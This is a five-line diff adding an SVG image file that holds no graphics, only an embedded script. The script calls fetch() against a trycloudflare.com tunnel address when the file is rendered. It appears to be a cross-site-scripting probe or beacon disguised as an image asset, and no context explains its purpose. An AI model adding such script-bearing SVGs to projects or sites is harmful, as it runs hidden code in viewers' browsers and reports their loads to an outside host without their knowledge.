@@ -1,0 +1,5 @@
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script>
+    fetch("https://strap-hearings-notified-settings.trycloudflare.com?svgscript=1");
+  </script>
+</svg>
